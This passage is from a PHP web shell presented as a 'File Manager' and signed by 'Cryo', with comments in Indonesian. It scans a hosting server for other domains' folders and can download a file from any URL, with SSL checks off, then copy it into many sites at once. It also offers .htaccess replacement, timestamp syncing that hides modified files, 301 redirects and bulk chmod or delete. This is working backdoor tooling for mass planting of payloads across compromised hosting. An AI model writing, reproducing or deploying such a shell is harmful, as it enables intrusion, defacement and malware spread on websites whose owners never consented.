        '.cpanel','.htpasswds','.trash','.config','.softaculous','.softaculous_backups',
        '.subaccounts','.ssh','.cl.selector','.cagefs','.pki','.local','.wp-cli','.wp-toolkit', '.caldav'
    ];

    $added = [];

    foreach ($roots as $root) {
        $rootReal = @realpath($root);
        if (!$rootReal || !is_dir($rootReal)) continue;
        if ($rootReal === DIRECTORY_SEPARATOR) continue;

        $isHomeRoot = ($parentReal && $rootReal === $parentReal);

        $queue = [[$rootReal, 0]];

        while (!empty($queue)) {
            [$dir, $depth] = array_shift($queue);

            if (!@is_readable($dir)) continue;

            try {
                $it = new DirectoryIterator($dir);
            } catch (Exception $e) {
                continue;
            }

            foreach ($it as $entry) {
                if ($entry->isDot()) continue;
                if (!$entry->isDir()) continue;

                $name = $entry->getFilename();

                if (in_array($name, $skipNames, true)) continue;

                if ($isHomeRoot && $depth === 0 && in_array($name, $excludeHome, true)) {
                    continue;
                }

                $full = $entry->getPathname();

                if (strpos($name, '.') !== false && $name[0] !== '.') {
                if (preg_match('/\d+\.\d+(\.\d+)?/', $name)) {
                    continue;
                }
                // Filter 2: Abaikan jika nama folder mengandung kata-kata umum folder proyek
                $skipWords = ['bower_components', 'node_modules', 'vendor', 'dist', 'build', 'src', 'lib', 'plugins', 'MathJax', 'socket.io', 'datatables', 'ion', 'jquery', 'ui'];
                foreach ($skipWords as $word) {
                    if (stripos($name, $word) !== false) {
                        continue 2; // skip folder ini dan lanjut ke iterasi berikutnya
                    }
                }
                // Filter 3: Abaikan jika nama folder tidak mirip domain (hanya huruf, angka, titik, hubung)
                if (!preg_match('/^[a-zA-Z0-9.-]+$/', $name)) {
                    continue;
                }
                // Filter 4: Abaikan jika setelah titik terakhir bukan TLD yang valid (2-6 huruf)
                $parts = explode('.', $name);
                $last = strtolower(end($parts));
                if (!preg_match('/^[a-z]{2,6}$/', $last)) {
                    continue;
                }

                $publicHtml = $full . DIRECTORY_SEPARATOR . 'public_html';
                $target     = is_dir($publicHtml) ? $publicHtml : $full;

                    $key = @realpath($target) ?: $target;
                    if (!isset($added[$key])) {
                        $added[$key] = 1;

                        $display = $key;
                        if (strpos($key, $rootReal) === 0) {
                            $rel = substr($key, strlen($rootReal));
                            $display = $rel === '' ? $key : $rel;
                        }

                        $list[] = [
                            'label'     => $name,
                            'target'    => $target,
                            'display'   => $display,
                            'from_root' => $rootReal,
                        ];

                        if (count($list) >= $maxFound) {
                            $errors[] = "Hasil scan dibatasi {$maxFound} folder. Ditampilkan sebagian saja.";
                            return true;
                        }
                    }
                }

                if ($depth + 1 <= $maxDepth) {
                    $queue[] = [$full, $depth + 1];
                }
            }
        }
    }

    if (empty($list)) {
        $errors[] = 'Tidak ada folder yang tampak seperti domain/subdomain di sekitar Document Root.';
        return false;
    }

    return true;
}

// Fungsi download file ke temp
function fm_download_remote_file_simple($url, &$tmpFile, &$err)
{
    $err = '';
    $tmpFile = tempnam(sys_get_temp_dir(), 'deploy_file_');
    if ($tmpFile === false) {
        $err = 'Gagal membuat file sementara.';
        return false;
    }

    if (function_exists('curl_init')) {
        $fp = @fopen($tmpFile, 'w');
        if (!$fp) {
            $err = 'Gagal membuka file sementara untuk ditulis.';
            return false;
        }

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_FILE           => $fp,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 60,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT      => 'DeployFileBot/1.0',
        ]);

        curl_exec($ch);
        if (curl_errno($ch)) {
            $err = 'cURL error: ' . curl_error($ch);
            fclose($fp);
            curl_close($ch);
            @unlink($tmpFile);
            return false;
        }

        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        fclose($fp);

        if ($httpCode < 200 || $httpCode >= 300) {
            $err = 'HTTP status tidak OK: ' . $httpCode;
            @unlink($tmpFile);
            return false;
        }
    } else {
        $context = stream_context_create([
            'http' => [
                'method'  => 'GET',
                'timeout' => 60,
            ],
            'ssl'  => [
                'verify_peer'      => false,
                'verify_peer_name' => false,
            ],
        ]);

        $data = @file_get_contents($url, false, $context);
        if ($data === false) {
            $err = 'Gagal membaca konten file (file_get_contents).';
            @unlink($tmpFile);
            return false;
        }

        if (@file_put_contents($tmpFile, $data) === false) {
            $err = 'Gagal menulis ke file sementara.';
            @unlink($tmpFile);
            return false;
        }
    }

    $size = @filesize($tmpFile);
    if ($size === false || $size == 0) {
        $err = 'File yang di-download berukuran 0 byte. URL mungkin tidak dapat diakses dari server.';
        @unlink($tmpFile);
        return false;
    }

    return true;
}

// Handler scan domain/subdomain
if (isset($_POST['deployScanDomains'])) {
    $items = [];
    $errs  = [];
    if (fm_collect_domain_targets($items, $errs)) {
        $_SESSION['deploy_scan_items']   = $items;
        $_SESSION['deploy_scan_message'] = 'Scan folder domain/subdomain selesai. Ditemukan ' . count($items) . ' target.';
    } else {
        $_SESSION['deploy_scan_items']   = [];
        $_SESSION['deploy_scan_message'] = implode(' | ', $errs);
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// Handler reset
if (isset($_POST['deployReset'])) {
    unset(
        $_SESSION['deploy_scan_items'],
        $_SESSION['deploy_scan_message'],
        $_SESSION['deploy_file_status'],
        $_SESSION['deploy_file_message']
    );
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// Handler deploy file
if (isset($_POST['deployRunFile'])) {
    $fileUrl      = isset($_POST['deploy_file_url']) ? trim($_POST['deploy_file_url']) : '';
    $subpath      = isset($_POST['deploy_file_path']) ? trim($_POST['deploy_file_path']) : '';
    $customName   = isset($_POST['deploy_file_name']) ? trim($_POST['deploy_file_name']) : '';
    $selected     = isset($_POST['deploy_file_targets']) && is_array($_POST['deploy_file_targets'])
        ? $_POST['deploy_file_targets']
        : [];

    $items  = isset($_SESSION['deploy_scan_items']) && is_array($_SESSION['deploy_scan_items'])
        ? $_SESSION['deploy_scan_items']
        : [];

    $errors      = [];
    $okPaths     = [];
    $serverPaths = [];

    if ($fileUrl === '' || !filter_var($fileUrl, FILTER_VALIDATE_URL)) {
        $errors[] = 'URL file tidak valid.';
    }
    if (empty($selected)) {
        $errors[] = 'Pilih minimal satu folder domain/subdomain.';
    }

    if (!$errors) {
        $subpathSafe = sanitizePath($subpath);
        $subpathSafe = trim($subpathSafe);

        $basename = basename(parse_url($fileUrl, PHP_URL_PATH) ?: '');
        $filename = $customName !== '' ? sanitizePath($customName) : sanitizePath($basename);
        if ($filename === '') $filename = 'downloaded_file';
        $filename = preg_replace('~[\\\\/]+~', '', $filename);

        $tempFile = '';
        if (!fm_download_remote_file_simple($fileUrl, $tempFile, $err)) {
            $errors[] = 'Gagal mendownload file: ' . $err;
        } else {
            $sizeTemp = @filesize($tempFile);
            if ($sizeTemp === false || $sizeTemp == 0) {
                $errors[] = 'File hasil download 0 byte. Cek URL atau akses server.';
                @unlink($tempFile);
            } else {
                foreach ($selected as $idxRaw) {
                    $idx = (int) $idxRaw;
                    if (!isset($items[$idx])) continue;

                    $info  = $items[$idx];
                    $base  = isset($info['target']) ? $info['target'] : '';
                    $label = isset($info['label']) ? $info['label'] : ('Target '.$idx);

                    if (!$base || !is_dir($base)) {
                        $errors[] = 'Base path tidak ditemukan: ' . $base;
                        continue;
                    }

                    $destDir = rtrim($base, '/');
                    if ($subpathSafe !== '' && $subpathSafe !== '/') {
                        $destDir .= '/' . ltrim($subpathSafe, '/');
                    }

                    if (!is_dir($destDir)) {
                        @mkdir($destDir, 0777, true);
                    }
                    if (!is_dir($destDir)) {
                        $errors[] = 'Gagal membuat folder tujuan: ' . $destDir;
                        continue;
                    }

                    $destFile = rtrim($destDir, '/') . '/' . $filename;

                    if (!@copy($tempFile, $destFile)) {
                        $errors[] = 'Gagal menyimpan file ke: ' . $destFile;
                        continue;
                    }

                    $friendly = $label;
                    if ($subpathSafe !== '' && $subpathSafe !== '/') {
                        $friendly .= '/' . ltrim($subpathSafe, '/');
                    }
                    $friendly .= '/' . $filename;

                    $okPaths[]     = $friendly;
                    $serverPaths[] = $destFile;
                }

                @unlink($tempFile);
            }
        }
    }

    if (!empty($okPaths)) {
        $status = empty($errors) ? 'success' : 'partial';

        $msg  = "Deploy FILE selesai.\n";
        $msg .= "Sumber file : {$fileUrl}\n";
        $msg .= "Nama file   : {$filename}\n";
        $msg .= "Target URL path (domain + subpath + nama file):\n - " . implode("\n - ", $okPaths);
        if (!empty($serverPaths)) {
            $msg .= "\n\nPath file di server:\n - " . implode("\n - ", $serverPaths);
        }
        if (!empty($errors)) {
            $msg .= "\n\nCatatan:\n - " . implode("\n - ", $errors);
        }

        $_SESSION['deploy_file_status']  = $status;
        $_SESSION['deploy_file_message'] = nl2br(htmlspecialchars($msg));
    } else {
        $_SESSION['deploy_file_status']  = 'error';
        $_SESSION['deploy_file_message'] = !empty($errors)
            ? htmlspecialchars(implode(' | ', $errors))
            : 'Deploy FILE gagal. Tidak ada target yang berhasil.';
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
        body {
            min-height: 100vh;
            background: linear-gradient(-45deg, #232536, #191930 40%, #183550 100%);
            background-size: 400% 400%;
            animation: gradientBG 14s ease infinite;
        }
        @keyframes gradientBG {
            0% { background-position: 0% 55%; }
            50% { background-position: 100% 46%; }
            100% { background-position: 0% 55%; }
        }
        body { background: transparent !important; font-family: Arial, Helvetica, sans-serif; color: #333; margin: 0; padding: 0; font-size:12px;}
        #bg-video { position: fixed; top: 0; left: 0; min-width: 100vw; min-height: 100vh; width: 100vw; height: 100vh; object-fit: cover; z-index: -2; opacity: 1; background: #222; pointer-events: none; filter: brightness(1);}
        .bg-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(20, 20, 20, 0.2); z-index: -1; pointer-events: none;}
        .file-manager { display: flex; width: 100%; margin-top: 6px;}
        .sidebar { width: 20%; padding: 7px; color: #fff;}
        .sidebar h3 { color: #ecf0f1; font-size:13px; margin:8px 0 4px 0;}
        .sidebar input, .sidebar button, .main-content input, .main-content button { font-size: 12px; padding: 5px 6px; border-radius: 3px;}
        .main-content { width: 80%; padding: 5px 5px 5px 0;}
        .file-list { margin-top: 0; width: 100%; }
        .file-item { display: flex; justify-content: space-between; align-items: center; gap: 5px; padding: 1.5px 1.5px; margin: 0.5px 0; border: 1px solid #ddd; border-radius: 2px; background-color: #fff; font-size: 12px;}
        .file-item.danger { border-left: 2px solid rgba(255, 0, 0, 0.64); background:rgba(214, 101, 101, 1);}
        .file-item.warning { border-left: 2px solid rgba(255, 204, 0, 0.7); background:rgba(214, 196, 107, 1);}
        .file-item.success { border-left: 2px solid rgba(9, 255, 0, 0.45); background:rgba(101, 207, 147, 1);}
        .file-item:hover { background-color:rgba(255, 255, 255, 0.2);}
        .file-item a, .file-item button[name="edit"] { text-decoration: none; color:rgb(0, 0, 0); background: none; border: none; cursor:pointer; font-size: 14px; font-weight: bold; padding:0;}
        .actions { min-width: 160px; display: flex; gap: 4px; justify-content: flex-end;}
        .actions form { margin: 0; }
        .actions button, .actions input[type="text"], .actions form { font-size: 11px; padding: 3px 6px; border-radius: 2.5px; min-width: 48px;}
        .actions button { border: 1px solid #ccc; border-radius: 4px; background-color: #2ecc71; color: white; cursor: pointer;}
        .actions button:hover { background-color: #27ae60;}
        .actions button.delete { background-color: #e74c3c;}
        .actions button.delete:hover { background-color: #c0392b;}
        .actions input[type="text"] { padding: 4px 5px; font-size: 11px; margin-right: 2px; border-radius: 2px; border: 1px solid #ccc; width: 25px;}
        .alert { padding: 7px; margin-bottom: 7px; border-radius: 5px; font-size: 12px;}
        .alert.success { background-color: #2ecc71; color: white;}
        .alert.error { background-color: #e74c3c; color: white;}
        textarea { width: 100%; height: 230px; border: 1px solid #ddd; border-radius: 4px; padding: 7px; font-size: 12px;}
        .logout-link { float: right; color: #e74c3c; text-decoration: none; margin-bottom: 6px; font-weight: bold; font-size:13px;}
        .logout-link:hover { text-decoration: underline; }
        .file-permission { font-size: 10px; margin-left: 7px; color: #555; letter-spacing: 1px; white-space:nowrap;}
        .logout-link { display: inline-flex; align-items: center; gap: 6px; padding: 5px 14px 5px 10px; border: 1.5px solid #e74c3c; background: #fff; border-radius: 15px; color: #e74c3c; text-decoration: none; margin-bottom: 5px;}
        .logout-link:hover { background: #ffeaea; color: #fff; background: linear-gradient(90deg, #e74c3c 0 100%);}
        .logout-link .logout-icon { font-size: 17px; display: inline-block; line-height: 1;}
        .nav-link { display: inline-block; padding: 4px 12px; border: 1px solid #3498db; border-radius: 11px; background: #ecf6fc; color: #2980b9; text-decoration: none; margin-right: 4px; font-weight: 500; font-size:12px;}
        .nav-link:hover { background: #3498db; color:#fff; }
        .nav-link.disabled, .nav-link[disabled] { cursor: not-allowed; color: #ff0000 !important; border-color: #ddd; background: #f8f8f8; pointer-events: none; }
        @media (max-width: 800px) {
            .file-manager { flex-direction:column;}
            .sidebar,.main-content { width: 100%;}
            .file-item { flex-direction: column; align-items: flex-start; }
            .file-item > .actions { width: 100%; justify-content: flex-start; }
        }
        .nama-file-folder-ellipsis {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            display: block;
            max-width: 210px;
        }
        .file-item-row {
        display: grid;
        grid-template-columns:
            28px  /* No */
            36px  /* Checkbox */
            32px  /* Emoji/Folder Icon */
            220px /* Nama File/Folder */
            92px  /* Size */
            68px  /* Permission */
            48px  /* Direct Link */
            158px /* Date Modified */
        ;
        align-items: center;
        gap: 0 6px;
        }

        @media (max-width: 900px) {
            .file-item-row {
                grid-template-columns: 22px 28px 24px 1fr 44px 36px 34px 84px;
                font-size: 11px;
            }
        }

        .search-box {
            margin: 10px 0;
            background: rgba(9, 9, 20, 0.96);
            border-radius: 8px;
            border: 1px solid #3b4259;
            color: #e5e7eb;
            padding: 8px 10px;
        }
        .search-box h3 {
            margin: 0 0 4px 0;
            font-size: 13px;
        }
        .search-box code {
            color: #cfe4ff;
        }
    </style>
</head>
<body>
<video autoplay loop muted playsinline id="bg-video">
    <source src="https://res.cloudinary.com/dowtrfruz/video/upload/v1751743944/pinterestdownloader.com-1751743705.806863_1_yqd7dy.mp4" type="video/mp4">
</video>
<div class="bg-overlay"></div>

<div class="file-manager">
    <div class="sidebar">
        <h3>Create File</h3>
        <form action="" method="post">
            <input type="text" name="fileName" placeholder="Nama File" required>
            <button type="submit" name="createFile">Create File</button>
        </form>
        <h3>Create Folder</h3>
        <form action="" method="post">
            <input type="text" name="folderName" placeholder="Nama Folder" required>
            <button type="submit" name="createFolder">Create Folder</button>
        </form>
        <h3>Upload File</h3>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload[]" multiple required>
            <button type="submit" name="upload">Upload</button>
        </form>
        <h3>Download File dari URL Atau Wget</h3>
        <form action="" method="post">
            <input type="url" name="fileUrl" placeholder="Masukkan URL file" required style="width:90%;">
            <input type="text" name="fileUrlName" placeholder="Nama file (opsional)" style="width:90%;">
            <button type="submit" name="downloadFromUrl">Download</button>
        </form>

        <h3>Scan</h3>
        <button type="button" onclick="showScanModal()" style="background:#00ffc8ff; color:#232323; font-weight:bold; border-radius:6px;">Scan</button>
        <?php if (!empty($_SESSION['scan_result_file']) && file_exists($_SESSION['scan_result_file'])): ?>
            <div style="margin-top:10px;">
                <a href="?downloadScan=1" style="color:#2ecc71; font-weight:bold;">⬇️ Download Hasil Scan</a>
            </div>
        <?php endif; ?>

        <h3>Search</h3>
        <button type="button"
                onclick="showSearchModal()"
                style="background:#38bdf8; color:#0b1020; border:1px solid #0284c7; border-radius:6px; padding:5px 10px; cursor:pointer;">
            Search
        </button>

        <h3>Deploy FILE ke Domain/Subdomain</h3>
        <div style="background:rgba(9,9,20,0.9); border-radius:8px; border:1px solid #3b4259; padding:8px 9px; color:#e5e7eb; font-size:11px;">
            <form method="post" action="" style="margin:0 0 6px 0;">
                <button type="submit" name="deployScanDomains"
                        style="background:#22c55e; color:#0b1020; border:1px solid #16a34a; border-radius:6px; padding:4px 10px; cursor:pointer; font-size:11px;">
                    Scan Folder Domain/Subdomain
                </button>
                <?php if (!empty($_SESSION['deploy_scan_message'])): ?>
                    <div style="margin-top:6px; color:#93c5fd;">
                        <?= htmlspecialchars($_SESSION['deploy_scan_message']) ?>
                    </div>
                <?php endif; ?>
            </form>

            <?php
            $deployItemsFile = isset($_SESSION['deploy_scan_items']) && is_array($_SESSION['deploy_scan_items'])
                ? $_SESSION['deploy_scan_items']
                : [];
            ?>

            <?php if (empty($deployItemsFile)): ?>
                <div style="font-size:11px; color:#9ca3af;">
                    Belum ada daftar folder domain/subdomain.<br>
                    Klik dulu tombol <b>"Scan Folder Domain/Subdomain"</b> di atas.
                </div>
            <?php else: ?>
                <div style="margin-bottom:6px; display:flex; gap:4px;">
                    <button type="button" onclick="selectAllDeployFile(true)" style="background:#3b82f6; color:#fff; border:none; border-radius:4px; padding:2px 8px; font-size:11px; cursor:pointer;">Pilih Semua</button>
                    <button type="button" onclick="selectAllDeployFile(false)" style="background:#6b7280; color:#fff; border:none; border-radius:4px; padding:2px 8px; font-size:11px; cursor:pointer;">Hapus Semua</button>
                </div>
                <form method="post" action="" style="margin:0;" id="deployFileForm">
                    <div style="max-height:120px; overflow:auto; border:1px solid #1f2937; border-radius:6px; padding:4px;">
                        <?php foreach ($deployItemsFile as $idx => $info): ?>
                            <label style="display:block; margin-bottom:2px; cursor:pointer;">
                                <input type="checkbox" name="deploy_file_targets[]" value="<?= (int)$idx ?>">
                                <strong><?= htmlspecialchars($info['label']) ?></strong>
                                <br>
                                <span style="color:#9ca3af;">Path: <code><?= htmlspecialchars($info['target']) ?></code></span>
                            </label>
                        <?php endforeach; ?>
                    </div>

                    <div style="margin-top:6px;">
                        <label style="display:block; margin-bottom:3px;">URL file</label>
                        <input type="url" name="deploy_file_url"
                               placeholder="https://domain.com/file.php"
                               style="width:95%; font-size:11px; padding:4px 5px; border-radius:4px; border:1px solid #4b5563;" required>
                    </div>

                    <div style="margin-top:6px;">
                        <label style="display:block; margin-bottom:3px;">
                            Nama file di server (opsional)
                        </label>
                        <input type="text" name="deploy_file_name"
                               placeholder="contoh: api.php (kosong = pakai nama aslinya)"
                               style="width:95%; font-size:11px; padding:4px 5px; border-radius:4px; border:1px solid #4b5563;">
                    </div>

                    <div style="margin-top:6px;">
                        <label style="display:block; margin-bottom:3px;">
                            Path simpan di dalam folder (opsional)
                        </label>
                        <input type="text" name="deploy_file_path"
                               placeholder="contoh: wp-content/plugins/custom"
                               style="width:95%; font-size:11px; padding:4px 5px; border-radius:4px; border:1px solid #4b5563;">
                        <div style="font-size:10px; color:#9ca3af; margin-top:2px;">
                            Kosongkan kalau mau simpan langsung di root folder domain/subdomain.
                        </div>
                    </div>

                    <input type="hidden" name="deployRunFile" value="1">

                    <div style="margin-top:8px; text-align:right;">
                        <button type="button"
                                onclick="confirmDeployFile()"
                                style="background:#f97316; color:#fff; border:1px solid #ea580c; border-radius:6px; padding:4px 10px; cursor:pointer; font-size:11px;">
                            Deploy FILE (konfirmasi)
                        </button>
                        <button type="submit" name="deployReset"
                                style="background:#4b5563; color:#e5e7eb; border:1px solid #374151; border-radius:6px; padding:4px 8px; cursor:pointer; font-size:11px; margin-left:4px;">
                            Reset
                        </button>
                    </div>
                </form>
            <?php endif; ?>
        </div>

        <h3>Replace .htaccess</h3>
        <button type="button" onclick="showHtaccessReplaceModal()" style="background:#ffd166;color:#232;border:1px solid #e0b64a;border-radius:6px;">Replace .htaccess</button>

        <h3>Sync Timestamp</h3>
        <form method="post" action="">
            <input type="text" name="ts_target" placeholder="/path/target (file/folder)" style="width:90%;" required>
            <input type="text" name="ts_ref" placeholder="/path/referensi (file/folder acuan)" style="width:90%; margin-top:6px;" required>
            <label style="display:block; font-size:11px; color:#fff; margin:6px 0;">
                <input type="checkbox" name="ts_recursive" value="1" checked> Rekursif (untuk folder)
            </label>
            <button type="submit" name="doSyncTimestamp" style="background:#a78bfa; color:#fff; border:1px solid #8b5cf6; border-radius:6px;">
                Samakan Timestamp
            </button>
            <div style="font-size:11px; color:#fff; margin-top:4px;">
                Path boleh absolut (<code>/...</code>) atau relatif dari Document Root.
            </div>
        </form>

        <h3>Redirect 301</h3>
        <button type="button"
                onclick="showRedirectModal()"
                style="background:#f97316; color:#fff; border:1px solid #ea580c; border-radius:6px; padding:5px 10px; cursor:pointer;">
            Redirect 301
        </button>

        <h3 style="color:rgba(0,0,0,0.7);">Admin</h3>
        <button type="button"
                onclick="showAdminModal()"
                style="background:rgba(0,0,0,0.7); color:#ffffff; border:1px solid #000; border-radius:6px; padding:5px 10px; cursor:pointer;">
            Admin
        </button>

    </div>
    <div class="main-content">
        <a href="Log.php" class="logout-link" id="logoutBtn">
        <span class="logout-icon">🔴</span> Logout
        </a>
        <h1 style="color: #00ffc8ff; font-size:16px; margin:10px 0 8px 0;">Jangan Dirusak ya!! (˶ᵔ ᵕ ᵔ˶) - Cryo</h1>
        <div style="margin-bottom:8px;">
            <?php if (count($_SESSION['dir_history']) > 1): ?>
                <a href="?back_dir=1" class="nav-link" style="margin-right:9px;">⬅️ Back</a>
            <?php else: ?>
                <span class="nav-link disabled" style="margin-right:9px;">⬅️ Back</span>
            <?php endif; ?>
            <?php if ($directory != $rootDirectory): ?>
                <a href="?folder=<?= urlencode($rootDirectory) ?>" class="nav-link" style="margin-right:9px;">🏠 Home</a>
            <?php else: ?>
                <span class="nav-link disabled" style="margin-right:9px;">🏠 Home</span>
            <?php endif; ?>
            <?php if ($directory != $rootPath): ?>
                <a href="?folder=<?= urlencode($rootPath) ?>" class="nav-link">🌐 Root</a>
            <?php else: ?>
                <span class="nav-link disabled">🌐 Root</span>
            <?php endif; ?>
        </div>
        <div style="position:relative; margin-bottom:8px;">
            <form method="get" style="display:inline;">
                <label for="customPath" style="color: #fff; font-size:11px; margin-right:5px;"><strong>Full Path:</strong></label>
                <input type="text" id="customPath" name="folder" 
                    value="<?= htmlspecialchars($directory) ?>" 
                    style="width:320px; font-size:11px; padding:3px 6px; border-radius:4px; border:1px solid #ff0000;"
                    autocomplete="off" spellcheck="false"
                >
                <button type="submit" style="font-size:11px; padding:2px 12px; border-radius:4px; margin-left:4px;">Go</button>
            </form>
        </div>

         <?php if (!empty($_SESSION['search_results']) && is_array($_SESSION['search_results'])): ?>
        <?php
            $searchRoot = (isset($_SESSION['search_root']) ? $_SESSION['search_root'] : '');
            $searchName = (isset($_SESSION['search_name']) ? $_SESSION['search_name'] : '');
            $searchText = (isset($_SESSION['search_content']) ? $_SESSION['search_content'] : '');
            $searchStats = (isset($_SESSION['search_stats']) ? $_SESSION['search_stats'] : array());
        ?>
        <div class="search-box">
            <h3>Hasil Search</h3>
            <div style="font-size:11px; margin-bottom:6px;">
                Root: <code><?= htmlspecialchars($searchRoot) ?></code><br>
                <?php if ($searchName !== ''): ?>
                    Nama mengandung: <code><?= htmlspecialchars($searchName) ?></code><br>
                <?php endif; ?>
                <?php if ($searchText !== ''): ?>
                    Isi file mengandung: <code><?= htmlspecialchars($searchText) ?></code><br>
                <?php endif; ?>
                <?php if (!empty($searchStats)): ?>
                    Folder discan: <?= (int)((isset($searchStats['dirs']) ? $searchStats['dirs'] : 0)) ?>,
                    file discan: <?= (int)((isset($searchStats['files']) ? $searchStats['files'] : 0)) ?>.
                    <?php if (!empty($searchStats['stoppedByLimit'])): ?>
                        <br><span style="color:#facc15;">Scan dihentikan karena melewati batas. Coba sempitkan root folder.</span>
                    <?php endif; ?>
                <?php endif; ?>
            </div>

            <div style="max-height:260px; overflow:auto; border:1px solid #2d3347; border-radius:6px;">
                <table style="width:100%; border-collapse:collapse; font-size:11px;">
                    <thead>
                        <tr style="background:#111827; color:#e5e7eb;">
                            <th style="padding:4px 5px; border-bottom:1px solid #374151;">Tipe</th>
                            <th style="padding:4px 5px; border-bottom:1px solid #374151;">Path</th>
                            <th style="padding:4px 5px; border-bottom:1px solid #374151;">Detail</th>
                            <th style="padding:4px 5px; border-bottom:1px solid #374151;">🔗</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php foreach ($_SESSION['search_results'] as $row): ?>
                        <tr style="border-bottom:1px solid #1f2933; background:#020617;">
                            <td style="padding:4px 5px; white-space:nowrap;">
                                <?php if ($row['type'] === 'name'): ?>
                                    <?= ($row['kind'] === 'dir') ? 'Nama Folder' : 'Nama File' ?>
                                <?php else: ?>
                                    Isi File
                                <?php endif; ?>
                            </td>
                            <td style="padding:4px 5px;">
                                <code><?= htmlspecialchars($row['path']) ?></code>
                            </td>
                            <td style="padding:4px 5px;">
                                <?php if ($row['type'] === 'content' && !empty($row['lines'])): ?>
                                    <?php foreach ($row['lines'] as $ln): ?>
                                        <div style="margin-bottom:3px;">
                                            <span style="color:#fbbf24;">Line <?= (int)$ln['line'] ?>:</span>
                                            <code><?= htmlspecialchars($ln['snippet']) ?></code>
                                        </div>
                                    <?php endforeach; ?>
                                <?php else: ?>
                                    &mdash;
                                <?php endif; ?>
                            </td>
                            <td style="padding:4px 5px; text-align:center;">
                                <?php if (!empty($row['full'])): ?>
                                    <?php $dl = getDirectLink($row['full']); ?>
                                    <a href="<?= htmlspecialchars($dl) ?>" target="_blank" style="color:#38bdf8;">
                                        <i class="fa fa-link" aria-hidden="true"></i>
                                    </a>
                                <?php endif; ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
        <?php
            unset($_SESSION['search_results'], $_SESSION['search_stats'], $_SESSION['search_root'], $_SESSION['search_name'], $_SESSION['search_content']);
        endif; ?>
        
        <form id="multiActionForm" action="" method="post">
            <div style="margin-bottom:10px;">
                <button type="button" onclick="selectAll(true)">Select All</button>
                <button type="button" onclick="selectAll(false)">Unselect All</button>
                <button type="submit" name="deleteSelected" onclick="return confirm('Yakin ingin menghapus semua yang dipilih?')">Delete Selected</button>
                <input type="text" name="chmodSelectedValue" placeholder="Chmod for selected (eg: 755)" style="width:90px;" pattern="[0-7]{3,4}" title="Contoh: 755">
                <button type="submit" name="chmodSelected">CHMOD Selected</button>
                <button type="submit" name="zipSelected" onclick="return confirm('ZIP semua yang dipilih ke dalam 1 file?')">ZIP Selected</button>
            </div>
            <div class="file-list">
                <!-- HEADER KOLOM -->
            <div class="file-item" style="background:#222846; font-weight:bold; color:#fff;">
                <div style="display: flex; align-items: center; gap: 7px; flex:1;">
                    <span style="min-width:20px;">#</span>
                    <span></span>
                    <span></span>
                    <span>Nama File/Folder</span>
                </div>
            </div>
            <?php
            $no = 0;
            foreach ($filesAndFolders as $item):
                $no++;
                $fullpath = $directory . '/' . $item;
                $colorClass = getPermissionColor($fullpath);
                $perms = (is_readable($fullpath) && @fileperms($fullpath)) ? substr(sprintf('%o', fileperms($fullpath)), -4) : '----';

                $timestamp = @filemtime($fullpath);
                if ($timestamp && is_numeric($timestamp)) {
                    $dt = new DateTime("@$timestamp");
                    $dt->setTimezone(new DateTimeZone('Asia/Jakarta'));
                    $dateModified = $dt->format('M-d H:i') . ' WIB';
                } else {
                    $dateModified = '📌';
                }

                $directLink = getDirectLink($fullpath);

                if (is_file($fullpath)) {
                    $sizeDisplay = getNiceSize(@filesize($fullpath));
                } elseif (is_dir($fullpath)) {
                    $sizeDisplay = '📌';
                } else {
                    $sizeDisplay = '📌';
                }
            ?>
            <div class="file-item <?= $colorClass ?>" title="Permission: <?= $perms ?>">
                <div style="display: flex; align-items: center; gap: 7px; flex:1;">
                    <span style="min-width:20px;"><?= $no ?></span>
                    <input type="checkbox" class="select-item" name="selectedItems[]" value="<?= htmlspecialchars($item) ?>">
                    <?php if (is_dir($fullpath)): ?>
                        <span style="font-size: 1.15em;">🗂️</span>
                        <a href="?folder=<?= urlencode($fullpath) ?>"
                        class="nama-file-folder-ellipsis"
                        style="max-width:210px;"
                        title="<?= htmlspecialchars($item) ?>">
                            <?= htmlspecialchars($item) ?>
                        </a>
                    <?php else: ?>
                        <span style="font-size: 1.05em;"><?= getFileEmoji($item) ?></span>
                        <form action="" method="post" style="display:inline;margin:0;padding:0;vertical-align:middle;max-width:210px;" id="editForm_<?= md5($item) ?>">
                            <input type="hidden" name="fileNameToEdit" value="<?= $item ?>">
                            <button type="submit" name="edit"
                                    class="nama-file-folder-ellipsis"
                                    style="font-size: 1em; vertical-align:middle; max-width:210px; overflow:hidden;"
                                    title="<?= htmlspecialchars($item) ?>">
                                <?= htmlspecialchars($item) ?>
                            </button>
                        </form>
                    <?php endif; ?>
                </div>
                <div class="actions" style="min-width:460px; display:flex; align-items:center; gap:4px; flex-wrap:wrap;">
                    <span title="Ukuran" style="font-size:11px; color:#ff0000; min-width:55px; display:inline-block; text-align:right;">
                        <?= $sizeDisplay ?>
                    </span>
                    <span class="file-permission" title="Izin" style="min-width:38px; color:#ff0000;">(<?= $perms ?>)</span>
                    <form action="" method="post" style="display: inline;">
                        <input type="hidden" name="oldName" value="<?= $item ?>">
                        <input type="text" name="newName" placeholder="New Name">
                        <button type="submit" name="rename">Rename</button>
                    </form>
                    <span title="Direct Link" style="font-size:14px;">
                        <a href="<?= htmlspecialchars($directLink) ?>" target="_blank" style="color:#1a73e8;">
                            <i class="fa fa-link" aria-hidden="true"></i>
                        </a>
                    </span>
                    <?php if (is_file($fullpath) && is_readable($fullpath)): ?>
                        <a href="?view=<?= urlencode($fullpath) ?>" title="View">
